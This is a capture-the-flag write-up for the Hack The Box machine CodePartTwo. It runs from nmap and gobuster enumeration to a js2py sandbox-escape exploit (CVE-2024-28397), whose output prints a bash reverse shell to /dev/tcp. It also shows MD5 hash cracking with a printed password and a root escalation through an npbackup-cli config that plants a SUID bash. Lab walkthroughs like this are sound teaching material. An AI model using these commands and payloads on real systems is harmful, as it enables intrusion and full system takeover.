@@ -1,0 +1,293 @@
+---
+title: "CodePartTwo"
+pubDate: "Jan 29 2026"
+description: "A guide to CodePartTwo htb machine"
+tags: ["htb", "writeup", "CodePartTwo", "CVE-2024-28397", "npbackup-cli", "linux"]
+author: "Koustubh Badshah"
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ea23d7bc12459ef0c3db19067f02352a.png"
+---
+
+# CodePartTwo
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+CodePartTwo is an easy linux machine on Hack The Box, released on 16<sup>th</sup> August 2025, is created by the user [FisMatHack](https://app.hackthebox.com/users/1076236).
+It focuses on exploiting a vulnerable web application to gain initial access, CVE-2024-28397 and then leveraging a misconfigured backup utility for privilege escalation.
+
+### Enumeration
+
+As always what anyone would do is perform a scan to know the target, the best of all the tools out there I prefer to use is `nmap`. I performed a
+nmap scan on the target machine to know the open ports and services running on it.
+
+```bash
+$ nmap -sCSV -v -T4 -p- <target-ip>
+```
+
+The scan result were as follow:
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
+|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
+|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
+8000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Welcome to CodePartTwo
+|_http-server-header: gunicorn/20.0.4
+| http-methods:
+|_  Supported Methods: HEAD OPTIONS GET
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+From the scan it is clear that there are two services running on the target machine, SSH on port 22 and web server on port 8000.
+
+I also ran a scan with `gobuster` to enumerate for any hidden files and directories on the web server.
+
+```bash
+$ gobuster dir -u http://<target-ip>:8000 -w <path-to-wordlist>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/dashboard            (Status: 302) [Size: 199] [--> /login]
+/download             (Status: 200) [Size: 10708]
+/login                (Status: 200) [Size: 667]
+/logout               (Status: 302) [Size: 189] [--> /]
+/register             (Status: 200) [Size: 651]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+No hidden files or directories were found.
+
+### Web Enumeration
+
+Gunicorn ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model ported from Ruby’s Unicorn project. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resource usage, and fairly speedy.
+I opened the web server address `http://<target-ip>:8000` in my browser to see if I can find some thing useful. The web page had three links
+register, login and a download link which gives a download link to source code of web app in zip format. Also I registered to the application and logged in 
+the application lets user write JS code and save and execute it surely this will lead to some RCE vulnerability but first I got my hands dirty with 
+the source code of the web app.
+
+```
+unzip app.zip
+cd app
+```
+
+### Exploitation 
+
+It is a flask application the `app.py`` provides loads of information the secret key `S3cr3tK3yC0d3PartTw0` and logic code.
+App uses MD5 hashing for storage which is not at all secure, next I saw `js2py` being used to execute the JS code which is a python library that can execute JS code from python.
+In requirements.txt it's version to be 0.74, on researching I found [CVE-2024-28397](https://github.com/naclapor/CVE-2024-28397) which allows RCE.
+On attacker side we can do following steps to exploit and perform RCE to get shell access.
+
+```bash
+$ git clone https://github.com/naclapor/CVE-2024-28397.git
+Cloning into 'CVE-2024-28397'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (10/10), done.
+remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (10/10), 7.08 KiB | 3.54 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+
+
+$ cd CVE-2024-28397/
+
+
+$ python3 exploit.py --target http://10.129.20.126:8000/run_code --lhost 10.10.16.18 --lport 1234
+============================================================
+CVE-2024-28397 - js2py Sandbox Escape Exploit
+Targets js2py <= 0.74
+============================================================
+
+[*] Generating exploit payload...
+[+] Target URL: http://10.129.20.126:8000/run_code
+[+] Reverse shell: (bash >& /dev/tcp/10.10.16.18/1234 0>&1) &
+[+] Base64 encoded: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvMTIzNCAwPiYxKSAm
+[+] Listening address: 10.10.16.18:1234
+
+[!] Start your listener: nc -lnvp 1234
+
+[*] Press Enter when your listener is ready...
+[*] Sending exploit payload...
+[+] Payload sent successfully!
+[+] Response: {"error":"'NoneType' object is not callable"}
+
+[+] Check your netcat listener for the reverse shell!
+```
+On the attacker machine I started a netcat listener on port 1234 to get the reverse shell.
+
+```bash
+nc -lnvp 1234
+```
+
+I went to instance directory to find user info and found this:
+```
+select * from user;
+1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+```
+
+One of them will surely be the user which can get ssh access. running `id` command I found the current user is `uid=1001(app) gid=1001(app) groups=1001(app)`
+and after enumeration I found that **app** user does not have any useful permissions or files so I proceeded to crack the MD5 hash obtained for 
+marco using **john the ripper**.
+
+```bash
+$ john \
+  --format=Raw-MD5 \
+  --wordlist=/usr/share/wordlists/rockyou.txt \
+  --fork=12 \
+  hash.txt
+```
+Password cracked is ` sweetangelbabylove`. SSH as marco and get the user flag.
+
+### Privilege Escalation
+
+I gathered system information to find any privilege escalation
+```bash 
+marco@codeparttwo:~$ whoami
+marco
+marco@codeparttwo:~$ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+marco@codeparttwo:~$ uname -a
+Linux codeparttwo 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+npbackup-cli is a backup utility installed on the system which runs with sudo privileges without password. On searching for `npbackup-cli` exploit I found it has a command injection vulnerability. By exploiting this vulnerability we can get root shell.
+
+Edit the backup configuration file and execute with the following commands:
+
+```
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri:
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password:
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: [/bin/cp /bin/bash /tmp/rootbash; /bin/chmod +s /tmp/rootbash]
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+
+$ sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
+$ cd /root
+$ cat root.txt
+```
+
+What I did here is modified the backup configuration file to add a post execution command to copy bash shell to /tmp directory and set SUID permission on it. So now any user can execute this bash shell with root privileges.
+
